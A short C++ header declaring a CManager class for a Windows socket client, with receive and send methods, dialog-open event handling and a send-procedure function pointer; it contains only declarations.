#pragma once

#include <winsock2.h>
#include "ClientSocket.h"
#include "macros.h"
#include "until.h"

#ifdef _CONSOLE
#include <stdio.h>
#endif

class CManager  
{
	friend class CClientSocket;

public:
	CManager(CClientSocket *pClient);
	virtual ~CManager();

	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	int Send(LPBYTE lpData, UINT nSize);

	void WaitForDialogOpen();
	void NotifyDialogIsOpen();

public:
	CClientSocket *m_pClient;
	HANDLE m_hEventDlgOpen;

private:
	typedef int (*SENDPROC)(LPBYTE lpData, UINT nSize);
	SENDPROC m_pSendProc;
};
